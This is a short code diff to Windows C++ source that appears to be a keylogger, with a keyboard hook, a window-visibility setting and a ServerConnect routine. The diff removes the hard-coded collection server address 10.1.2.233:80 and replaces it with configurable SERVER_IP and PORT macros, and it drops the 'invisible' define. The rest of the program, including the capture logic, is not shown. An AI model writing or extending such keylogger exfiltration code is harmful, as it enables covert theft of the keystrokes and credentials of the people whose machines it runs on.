@@ -1,15 +1,13 @@
+#include <winsock2.h>
 
 #include <Windows.h>
 #include <stdio.h>
 #include <time.h>
-#include <winsock2.h>
 #include <cstdio>
 #include <fstream>
 #include <iostream>
 
 // defines whether the window is visible or not
-// should be solved with makefile, not in this file
-#define invisible  // (visible / invisible)
 #define BUFFERSIZE 100
 
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then
@@ -209,8 +207,8 @@ int ServerConnect(SOCKET &sockfd)
     WSADATA wsadata;
 
     address.sin_family = AF_INET;
-    address.sin_addr.s_addr = inet_addr("10.1.2.233");
-    address.sin_port = 80;
+    address.sin_addr.s_addr = inet_addr(SERVER_IP);
+    address.sin_port = PORT;
     len = sizeof(address);
 
     if (WSAStartup(0x101, (LPWSADATA) &wsadata) != 0) {
